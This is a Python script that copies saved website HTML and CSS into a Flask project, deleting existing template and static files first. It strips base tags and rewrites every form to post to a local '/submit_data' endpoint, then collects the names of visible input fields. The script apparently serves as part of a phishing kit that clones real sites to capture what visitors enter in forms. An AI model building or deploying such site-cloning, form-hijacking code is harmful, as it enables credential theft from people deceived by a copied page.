from bs4 import BeautifulSoup
import chardet
import os
import shutil

inputlist =[]
inputnames = []
cwd = os.getcwd()



def copy_files(website_folder, filename):
    #paths to files:
    website_path = os.path.join(cwd, 'websites', website_folder)
    templates_path = os.path.join(cwd, 'templates')
    static_path = os.path.join(cwd, 'static')

    # Delete existing files in the 'static' folder
    for file in os.listdir(static_path):
        file_path = os.path.join(static_path, file)
        if os.path.isfile(file_path):
            os.remove(file_path)

    # Delete existing files in the 'templates' folder
    for file in os.listdir(templates_path):
        file_path = os.path.join(templates_path, file)
        if os.path.isfile(file_path):
            os.remove(file_path)

    source_file = os.path.join(website_path, filename)
    destination_file = os.path.join(templates_path, filename)
    shutil.copy(source_file, destination_file)
    #copy css
    files = os.listdir(website_path)
    for file in files:
        if file.endswith('.css'):
            source_file = os.path.join(website_path, file)
            destination_file = os.path.join(static_path, file)
            shutil.copy(source_file, destination_file)

def implement_form():
    file_path = os.path.join('templates', 'index.html')
    with open(file_path, 'rb') as f:
        data = f.read()
        encoding = chardet.detect(data)['encoding']
        html = data.decode(encoding)

    soup = BeautifulSoup(html, 'html.parser')

    bases = soup.find_all('base')
    forms = soup.find_all('form')
    for base in bases:
        base.decompose()
    
    for form in forms:
            form['action'] = '/submit_data'
            form['method'] = 'POST'
    with open(file_path, 'w', encoding='utf-8') as f:
        f.write(str(soup))

def get_vars_for_flask(list1, list2):
    file_path = os.path.join('templates', 'index.html')
    with open(file_path, 'rb') as f:
        data = f.read()
        encoding = chardet.detect(data)['encoding']
        html = data.decode(encoding)

    soup = BeautifulSoup(html, 'html.parser')
    forms = soup.find_all('form')
    for form in forms:
        inputs = form.find_all('input')
        if inputs:
            for input_field in inputs:
                if input_field.get('type') != 'hidden':
                    if input_field.get("aria-hidden") != "true":
                        if input_field.get("hidden") != "hidden":
                            list1.append(input_field)
                            input_name = input_field.get('name')
                            if input_name:
                                list2.append(input_name)
                            
        else:
            print('No input fields found in form:')
    




# edit_forms()
# get_vars_for_flask(inputlist, inputnames)
# iniate_flask(inputnames)
